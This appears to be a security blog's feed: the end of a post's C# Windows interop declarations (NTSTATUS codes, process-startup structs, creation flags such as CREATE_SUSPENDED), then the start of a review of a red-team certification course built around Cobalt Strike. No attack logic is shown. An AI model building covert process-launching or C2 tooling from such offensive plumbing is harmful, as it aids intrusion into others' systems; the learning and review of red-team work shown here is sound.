+</span></span><span style="display:flex;"><span>			IoTimeout = <span style="color:#ae81ff">0xc00000b5</span>,
+</span></span><span style="display:flex;"><span>			FileForcedClosed = <span style="color:#ae81ff">0xc00000b6</span>,
+</span></span><span style="display:flex;"><span>			ProfilingNotStarted = <span style="color:#ae81ff">0xc00000b7</span>,
+</span></span><span style="display:flex;"><span>			ProfilingNotStopped = <span style="color:#ae81ff">0xc00000b8</span>,
+</span></span><span style="display:flex;"><span>			NotSameDevice = <span style="color:#ae81ff">0xc00000d4</span>,
+</span></span><span style="display:flex;"><span>			FileRenamed = <span style="color:#ae81ff">0xc00000d5</span>,
+</span></span><span style="display:flex;"><span>			CantWait = <span style="color:#ae81ff">0xc00000d8</span>,
+</span></span><span style="display:flex;"><span>			PipeEmpty = <span style="color:#ae81ff">0xc00000d9</span>,
+</span></span><span style="display:flex;"><span>			CantTerminateSelf = <span style="color:#ae81ff">0xc00000db</span>,
+</span></span><span style="display:flex;"><span>			InternalError = <span style="color:#ae81ff">0xc00000e5</span>,
+</span></span><span style="display:flex;"><span>			InvalidParameter1 = <span style="color:#ae81ff">0xc00000ef</span>,
+</span></span><span style="display:flex;"><span>			InvalidParameter2 = <span style="color:#ae81ff">0xc00000f0</span>,
+</span></span><span style="display:flex;"><span>			InvalidParameter3 = <span style="color:#ae81ff">0xc00000f1</span>,
+</span></span><span style="display:flex;"><span>			InvalidParameter4 = <span style="color:#ae81ff">0xc00000f2</span>,
+</span></span><span style="display:flex;"><span>			InvalidParameter5 = <span style="color:#ae81ff">0xc00000f3</span>,
+</span></span><span style="display:flex;"><span>			InvalidParameter6 = <span style="color:#ae81ff">0xc00000f4</span>,
+</span></span><span style="display:flex;"><span>			InvalidParameter7 = <span style="color:#ae81ff">0xc00000f5</span>,
+</span></span><span style="display:flex;"><span>			InvalidParameter8 = <span style="color:#ae81ff">0xc00000f6</span>,
+</span></span><span style="display:flex;"><span>			InvalidParameter9 = <span style="color:#ae81ff">0xc00000f7</span>,
+</span></span><span style="display:flex;"><span>			InvalidParameter10 = <span style="color:#ae81ff">0xc00000f8</span>,
+</span></span><span style="display:flex;"><span>			InvalidParameter11 = <span style="color:#ae81ff">0xc00000f9</span>,
+</span></span><span style="display:flex;"><span>			InvalidParameter12 = <span style="color:#ae81ff">0xc00000fa</span>,
+</span></span><span style="display:flex;"><span>			ProcessIsTerminating = <span style="color:#ae81ff">0xc000010a</span>,
+</span></span><span style="display:flex;"><span>			MappedFileSizeZero = <span style="color:#ae81ff">0xc000011e</span>,
+</span></span><span style="display:flex;"><span>			TooManyOpenedFiles = <span style="color:#ae81ff">0xc000011f</span>,
+</span></span><span style="display:flex;"><span>			Cancelled = <span style="color:#ae81ff">0xc0000120</span>,
+</span></span><span style="display:flex;"><span>			CannotDelete = <span style="color:#ae81ff">0xc0000121</span>,
+</span></span><span style="display:flex;"><span>			InvalidComputerName = <span style="color:#ae81ff">0xc0000122</span>,
+</span></span><span style="display:flex;"><span>			FileDeleted = <span style="color:#ae81ff">0xc0000123</span>,
+</span></span><span style="display:flex;"><span>			SpecialAccount = <span style="color:#ae81ff">0xc0000124</span>,
+</span></span><span style="display:flex;"><span>			SpecialGroup = <span style="color:#ae81ff">0xc0000125</span>,
+</span></span><span style="display:flex;"><span>			SpecialUser = <span style="color:#ae81ff">0xc0000126</span>,
+</span></span><span style="display:flex;"><span>			MembersPrimaryGroup = <span style="color:#ae81ff">0xc0000127</span>,
+</span></span><span style="display:flex;"><span>			FileClosed = <span style="color:#ae81ff">0xc0000128</span>,
+</span></span><span style="display:flex;"><span>			TooManyThreads = <span style="color:#ae81ff">0xc0000129</span>,
+</span></span><span style="display:flex;"><span>			ThreadNotInProcess = <span style="color:#ae81ff">0xc000012a</span>,
+</span></span><span style="display:flex;"><span>			TokenAlreadyInUse = <span style="color:#ae81ff">0xc000012b</span>,
+</span></span><span style="display:flex;"><span>			PagefileQuotaExceeded = <span style="color:#ae81ff">0xc000012c</span>,
+</span></span><span style="display:flex;"><span>			CommitmentLimit = <span style="color:#ae81ff">0xc000012d</span>,
+</span></span><span style="display:flex;"><span>			InvalidImageLeFormat = <span style="color:#ae81ff">0xc000012e</span>,
+</span></span><span style="display:flex;"><span>			InvalidImageNotMz = <span style="color:#ae81ff">0xc000012f</span>,
+</span></span><span style="display:flex;"><span>			InvalidImageProtect = <span style="color:#ae81ff">0xc0000130</span>,
+</span></span><span style="display:flex;"><span>			InvalidImageWin16 = <span style="color:#ae81ff">0xc0000131</span>,
+</span></span><span style="display:flex;"><span>			LogonServer = <span style="color:#ae81ff">0xc0000132</span>,
+</span></span><span style="display:flex;"><span>			DifferenceAtDc = <span style="color:#ae81ff">0xc0000133</span>,
+</span></span><span style="display:flex;"><span>			SynchronizationRequired = <span style="color:#ae81ff">0xc0000134</span>,
+</span></span><span style="display:flex;"><span>			DllNotFound = <span style="color:#ae81ff">0xc0000135</span>,
+</span></span><span style="display:flex;"><span>			IoPrivilegeFailed = <span style="color:#ae81ff">0xc0000137</span>,
+</span></span><span style="display:flex;"><span>			OrdinalNotFound = <span style="color:#ae81ff">0xc0000138</span>,
+</span></span><span style="display:flex;"><span>			EntryPointNotFound = <span style="color:#ae81ff">0xc0000139</span>,
+</span></span><span style="display:flex;"><span>			ControlCExit = <span style="color:#ae81ff">0xc000013a</span>,
+</span></span><span style="display:flex;"><span>			InvalidAddress = <span style="color:#ae81ff">0xc0000141</span>,
+</span></span><span style="display:flex;"><span>			PortNotSet = <span style="color:#ae81ff">0xc0000353</span>,
+</span></span><span style="display:flex;"><span>			DebuggerInactive = <span style="color:#ae81ff">0xc0000354</span>,
+</span></span><span style="display:flex;"><span>			CallbackBypass = <span style="color:#ae81ff">0xc0000503</span>,
+</span></span><span style="display:flex;"><span>			PortClosed = <span style="color:#ae81ff">0xc0000700</span>,
+</span></span><span style="display:flex;"><span>			MessageLost = <span style="color:#ae81ff">0xc0000701</span>,
+</span></span><span style="display:flex;"><span>			InvalidMessage = <span style="color:#ae81ff">0xc0000702</span>,
+</span></span><span style="display:flex;"><span>			RequestCanceled = <span style="color:#ae81ff">0xc0000703</span>,
+</span></span><span style="display:flex;"><span>			RecursiveDispatch = <span style="color:#ae81ff">0xc0000704</span>,
+</span></span><span style="display:flex;"><span>			LpcReceiveBufferExpected = <span style="color:#ae81ff">0xc0000705</span>,
+</span></span><span style="display:flex;"><span>			LpcInvalidConnectionUsage = <span style="color:#ae81ff">0xc0000706</span>,
+</span></span><span style="display:flex;"><span>			LpcRequestsNotAllowed = <span style="color:#ae81ff">0xc0000707</span>,
+</span></span><span style="display:flex;"><span>			ResourceInUse = <span style="color:#ae81ff">0xc0000708</span>,
+</span></span><span style="display:flex;"><span>			ProcessIsProtected = <span style="color:#ae81ff">0xc0000712</span>,
+</span></span><span style="display:flex;"><span>			VolumeDirty = <span style="color:#ae81ff">0xc0000806</span>,
+</span></span><span style="display:flex;"><span>			FileCheckedOut = <span style="color:#ae81ff">0xc0000901</span>,
+</span></span><span style="display:flex;"><span>			CheckOutRequired = <span style="color:#ae81ff">0xc0000902</span>,
+</span></span><span style="display:flex;"><span>			BadFileType = <span style="color:#ae81ff">0xc0000903</span>,
+</span></span><span style="display:flex;"><span>			FileTooLarge = <span style="color:#ae81ff">0xc0000904</span>,
+</span></span><span style="display:flex;"><span>			FormsAuthRequired = <span style="color:#ae81ff">0xc0000905</span>,
+</span></span><span style="display:flex;"><span>			VirusInfected = <span style="color:#ae81ff">0xc0000906</span>,
+</span></span><span style="display:flex;"><span>			VirusDeleted = <span style="color:#ae81ff">0xc0000907</span>,
+</span></span><span style="display:flex;"><span>			TransactionalConflict = <span style="color:#ae81ff">0xc0190001</span>,
+</span></span><span style="display:flex;"><span>			InvalidTransaction = <span style="color:#ae81ff">0xc0190002</span>,
+</span></span><span style="display:flex;"><span>			TransactionNotActive = <span style="color:#ae81ff">0xc0190003</span>,
+</span></span><span style="display:flex;"><span>			TmInitializationFailed = <span style="color:#ae81ff">0xc0190004</span>,
+</span></span><span style="display:flex;"><span>			RmNotActive = <span style="color:#ae81ff">0xc0190005</span>,
+</span></span><span style="display:flex;"><span>			RmMetadataCorrupt = <span style="color:#ae81ff">0xc0190006</span>,
+</span></span><span style="display:flex;"><span>			TransactionNotJoined = <span style="color:#ae81ff">0xc0190007</span>,
+</span></span><span style="display:flex;"><span>			DirectoryNotRm = <span style="color:#ae81ff">0xc0190008</span>,
+</span></span><span style="display:flex;"><span>			CouldNotResizeLog = <span style="color:#ae81ff">0xc0190009</span>,
+</span></span><span style="display:flex;"><span>			TransactionsUnsupportedRemote = <span style="color:#ae81ff">0xc019000a</span>,
+</span></span><span style="display:flex;"><span>			LogResizeInvalidSize = <span style="color:#ae81ff">0xc019000b</span>,
+</span></span><span style="display:flex;"><span>			RemoteFileVersionMismatch = <span style="color:#ae81ff">0xc019000c</span>,
+</span></span><span style="display:flex;"><span>			CrmProtocolAlreadyExists = <span style="color:#ae81ff">0xc019000f</span>,
+</span></span><span style="display:flex;"><span>			TransactionPropagationFailed = <span style="color:#ae81ff">0xc0190010</span>,
+</span></span><span style="display:flex;"><span>			CrmProtocolNotFound = <span style="color:#ae81ff">0xc0190011</span>,
+</span></span><span style="display:flex;"><span>			TransactionSuperiorExists = <span style="color:#ae81ff">0xc0190012</span>,
+</span></span><span style="display:flex;"><span>			TransactionRequestNotValid = <span style="color:#ae81ff">0xc0190013</span>,
+</span></span><span style="display:flex;"><span>			TransactionNotRequested = <span style="color:#ae81ff">0xc0190014</span>,
+</span></span><span style="display:flex;"><span>			TransactionAlreadyAborted = <span style="color:#ae81ff">0xc0190015</span>,
+</span></span><span style="display:flex;"><span>			TransactionAlreadyCommitted = <span style="color:#ae81ff">0xc0190016</span>,
+</span></span><span style="display:flex;"><span>			TransactionInvalidMarshallBuffer = <span style="color:#ae81ff">0xc0190017</span>,
+</span></span><span style="display:flex;"><span>			CurrentTransactionNotValid = <span style="color:#ae81ff">0xc0190018</span>,
+</span></span><span style="display:flex;"><span>			LogGrowthFailed = <span style="color:#ae81ff">0xc0190019</span>,
+</span></span><span style="display:flex;"><span>			ObjectNoLongerExists = <span style="color:#ae81ff">0xc0190021</span>,
+</span></span><span style="display:flex;"><span>			StreamMiniversionNotFound = <span style="color:#ae81ff">0xc0190022</span>,
+</span></span><span style="display:flex;"><span>			StreamMiniversionNotValid = <span style="color:#ae81ff">0xc0190023</span>,
+</span></span><span style="display:flex;"><span>			MiniversionInaccessibleFromSpecifiedTransaction = <span style="color:#ae81ff">0xc0190024</span>,
+</span></span><span style="display:flex;"><span>			CantOpenMiniversionWithModifyIntent = <span style="color:#ae81ff">0xc0190025</span>,
+</span></span><span style="display:flex;"><span>			CantCreateMoreStreamMiniversions = <span style="color:#ae81ff">0xc0190026</span>,
+</span></span><span style="display:flex;"><span>			HandleNoLongerValid = <span style="color:#ae81ff">0xc0190028</span>,
+</span></span><span style="display:flex;"><span>			NoTxfMetadata = <span style="color:#ae81ff">0xc0190029</span>,
+</span></span><span style="display:flex;"><span>			LogCorruptionDetected = <span style="color:#ae81ff">0xc0190030</span>,
+</span></span><span style="display:flex;"><span>			CantRecoverWithHandleOpen = <span style="color:#ae81ff">0xc0190031</span>,
+</span></span><span style="display:flex;"><span>			RmDisconnected = <span style="color:#ae81ff">0xc0190032</span>,
+</span></span><span style="display:flex;"><span>			EnlistmentNotSuperior = <span style="color:#ae81ff">0xc0190033</span>,
+</span></span><span style="display:flex;"><span>			RecoveryNotNeeded = <span style="color:#ae81ff">0xc0190034</span>,
+</span></span><span style="display:flex;"><span>			RmAlreadyStarted = <span style="color:#ae81ff">0xc0190035</span>,
+</span></span><span style="display:flex;"><span>			FileIdentityNotPersistent = <span style="color:#ae81ff">0xc0190036</span>,
+</span></span><span style="display:flex;"><span>			CantBreakTransactionalDependency = <span style="color:#ae81ff">0xc0190037</span>,
+</span></span><span style="display:flex;"><span>			CantCrossRmBoundary = <span style="color:#ae81ff">0xc0190038</span>,
+</span></span><span style="display:flex;"><span>			TxfDirNotEmpty = <span style="color:#ae81ff">0xc0190039</span>,
+</span></span><span style="display:flex;"><span>			IndoubtTransactionsExist = <span style="color:#ae81ff">0xc019003a</span>,
+</span></span><span style="display:flex;"><span>			TmVolatile = <span style="color:#ae81ff">0xc019003b</span>,
+</span></span><span style="display:flex;"><span>			RollbackTimerExpired = <span style="color:#ae81ff">0xc019003c</span>,
+</span></span><span style="display:flex;"><span>			TxfAttributeCorrupt = <span style="color:#ae81ff">0xc019003d</span>,
+</span></span><span style="display:flex;"><span>			EfsNotAllowedInTransaction = <span style="color:#ae81ff">0xc019003e</span>,
+</span></span><span style="display:flex;"><span>			TransactionalOpenNotAllowed = <span style="color:#ae81ff">0xc019003f</span>,
+</span></span><span style="display:flex;"><span>			TransactedMappingUnsupportedRemote = <span style="color:#ae81ff">0xc0190040</span>,
+</span></span><span style="display:flex;"><span>			TxfMetadataAlreadyPresent = <span style="color:#ae81ff">0xc0190041</span>,
+</span></span><span style="display:flex;"><span>			TransactionScopeCallbacksNotSet = <span style="color:#ae81ff">0xc0190042</span>,
+</span></span><span style="display:flex;"><span>			TransactionRequiredPromotion = <span style="color:#ae81ff">0xc0190043</span>,
+</span></span><span style="display:flex;"><span>			CannotExecuteFileInTransaction = <span style="color:#ae81ff">0xc0190044</span>,
+</span></span><span style="display:flex;"><span>			TransactionsNotFrozen = <span style="color:#ae81ff">0xc0190045</span>,
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>			MaximumNtStatus = <span style="color:#ae81ff">0xffffffff</span>
+</span></span><span style="display:flex;"><span>		}
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">
+</span></span></span><span style="display:flex;"><span><span style="color:#a6e22e">		[StructLayout(LayoutKind.Sequential)]</span>
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">public</span> <span style="color:#66d9ef">struct</span> <span style="color:#a6e22e">UNICODE_STRING</span>
+</span></span><span style="display:flex;"><span>		{
+</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">public</span> UInt16 Length;
+</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">public</span> UInt16 MaximumLength;
+</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">public</span> IntPtr Buffer;
+</span></span><span style="display:flex;"><span>		}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">public</span> <span style="color:#66d9ef">struct</span> <span style="color:#a6e22e">PROCESS_INFORMATION</span>
+</span></span><span style="display:flex;"><span>		{
+</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">public</span> IntPtr hProcess;
+</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">public</span> IntPtr hThread;
+</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">public</span> <span style="color:#66d9ef">uint</span> dwProcessId;
+</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">public</span> <span style="color:#66d9ef">uint</span> dwThreadId;
+</span></span><span style="display:flex;"><span>		}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">public</span> <span style="color:#66d9ef">struct</span> <span style="color:#a6e22e">STARTUPINFO</span>
+</span></span><span style="display:flex;"><span>		{
+</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">public</span> <span style="color:#66d9ef">uint</span> cb;
+</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">public</span> <span style="color:#66d9ef">string</span> lpReserved;
+</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">public</span> <span style="color:#66d9ef">string</span> lpDesktop;
+</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">public</span> <span style="color:#66d9ef">string</span> lpTitle;
+</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">public</span> <span style="color:#66d9ef">uint</span> dwX;
+</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">public</span> <span style="color:#66d9ef">uint</span> dwY;
+</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">public</span> <span style="color:#66d9ef">uint</span> dwXSize;
+</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">public</span> <span style="color:#66d9ef">uint</span> dwYSize;
+</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">public</span> <span style="color:#66d9ef">uint</span> dwXCountChars;
+</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">public</span> <span style="color:#66d9ef">uint</span> dwYCountChars;
+</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">public</span> <span style="color:#66d9ef">uint</span> dwFillAttribute;
+</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">public</span> <span style="color:#66d9ef">uint</span> dwFlags;
+</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">public</span> <span style="color:#66d9ef">short</span> wShowWindow;
+</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">public</span> <span style="color:#66d9ef">short</span> cbReserved2;
+</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">public</span> IntPtr lpReserved2;
+</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">public</span> IntPtr hStdInput;
+</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">public</span> IntPtr hStdOutput;
+</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">public</span> IntPtr hStdError;
+</span></span><span style="display:flex;"><span>		}
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">
+</span></span></span><span style="display:flex;"><span><span style="color:#a6e22e">		[Flags]</span>
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">public</span> <span style="color:#66d9ef">enum</span> ProcessCreationFlags : <span style="color:#66d9ef">uint</span>
+</span></span><span style="display:flex;"><span>		{
+</span></span><span style="display:flex;"><span>			ZERO_FLAG = <span style="color:#ae81ff">0x00000000</span>,
+</span></span><span style="display:flex;"><span>			CREATE_BREAKAWAY_FROM_JOB = <span style="color:#ae81ff">0x01000000</span>,
+</span></span><span style="display:flex;"><span>			CREATE_DEFAULT_ERROR_MODE = <span style="color:#ae81ff">0x04000000</span>,
+</span></span><span style="display:flex;"><span>			CREATE_NEW_CONSOLE = <span style="color:#ae81ff">0x00000010</span>,
+</span></span><span style="display:flex;"><span>			CREATE_NEW_PROCESS_GROUP = <span style="color:#ae81ff">0x00000200</span>,
+</span></span><span style="display:flex;"><span>			CREATE_NO_WINDOW = <span style="color:#ae81ff">0x08000000</span>,
+</span></span><span style="display:flex;"><span>			CREATE_PROTECTED_PROCESS = <span style="color:#ae81ff">0x00040000</span>,
+</span></span><span style="display:flex;"><span>			CREATE_PRESERVE_CODE_AUTHZ_LEVEL = <span style="color:#ae81ff">0x02000000</span>,
+</span></span><span style="display:flex;"><span>			CREATE_SEPARATE_WOW_VDM = <span style="color:#ae81ff">0x00001000</span>,
+</span></span><span style="display:flex;"><span>			CREATE_SHARED_WOW_VDM = <span style="color:#ae81ff">0x00001000</span>,
+</span></span><span style="display:flex;"><span>			CREATE_SUSPENDED = <span style="color:#ae81ff">0x00000004</span>,
+</span></span><span style="display:flex;"><span>			CREATE_UNICODE_ENVIRONMENT = <span style="color:#ae81ff">0x00000400</span>,
+</span></span><span style="display:flex;"><span>			DEBUG_ONLY_THIS_PROCESS = <span style="color:#ae81ff">0x00000002</span>,
+</span></span><span style="display:flex;"><span>			DEBUG_PROCESS = <span style="color:#ae81ff">0x00000001</span>,
+</span></span><span style="display:flex;"><span>			DETACHED_PROCESS = <span style="color:#ae81ff">0x00000008</span>,
+</span></span><span style="display:flex;"><span>			EXTENDED_STARTUPINFO_PRESENT = <span style="color:#ae81ff">0x00080000</span>,
+</span></span><span style="display:flex;"><span>			INHERIT_PARENT_AFFINITY = <span style="color:#ae81ff">0x00010000</span>
+</span></span><span style="display:flex;"><span>		}
+</span></span><span style="display:flex;"><span>	}
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div>]]></content></item><item><title>Certified Red Team Operator (CRTO) by Zero Point Security Review</title><link>https://jakemai0.github.io/posts/crto/</link><pubDate>Fri, 22 Apr 2022 00:00:00 +0000</pubDate><guid>https://jakemai0.github.io/posts/crto/</guid><description>Introduction Red Team Ops is a course offered by Zero Point Security, which serves as an Introduction to Red Teaming with a focus on the use of Cobalt Strike C2. When the students finish the course and pass the 48 hour exam (don&amp;rsquo;t worry, it&amp;rsquo;s not like the 300 level courses by OffSec), the students will receive the &amp;ldquo;Certified Red Team Operator&amp;rdquo; certification. If you&amp;rsquo;re new to the community, Zero Point Security is a one-man company created and operated by Daniel Duggan aka RastaMouse.</description><content type="html"><![CDATA[<h2 id="introduction">Introduction</h2>
 <p><a href="https://courses.zeropointsecurity.co.uk/courses/red-team-ops">Red Team Ops</a> is a course offered by Zero Point Security, which serves as an Introduction to Red Teaming with a focus on the use of <a href="https://www.cobaltstrike.com/">Cobalt Strike</a> C2. When the students finish the course and pass the 48 hour exam (don&rsquo;t worry, it&rsquo;s not like the 300 level courses by OffSec), the students will receive the &ldquo;Certified Red Team Operator&rdquo; certification.
 If you&rsquo;re new to the community, Zero Point Security is a one-man company created and operated by Daniel Duggan aka <a href="https://twitter.com/_rastamouse?lang=en">RastaMouse</a>. He is well known in the infosec community for many of his contributions such as the open-source C2 <a href="https://github.com/SharpC2/SharpC2">SharpC2</a>, the <a href="https://app.hackthebox.com/prolabs/overview/rastalabs">RastaLabs</a> ProLab on HackTheBox, the <a href="https://courses.zeropointsecurity.co.uk/courses/c2-development-in-csharp">C2 Development in C#</a> course, the <a href="https://courses.zeropointsecurity.co.uk/courses/offensive-driver-development">Offensive Driver Development</a> course and the RTO course that I will be talking about.</p>
 <p>In this post I will be going over my experience with the course and the exam, what I think about this course and whether you should be taking it or not (spoiler: yes, you should).</p>
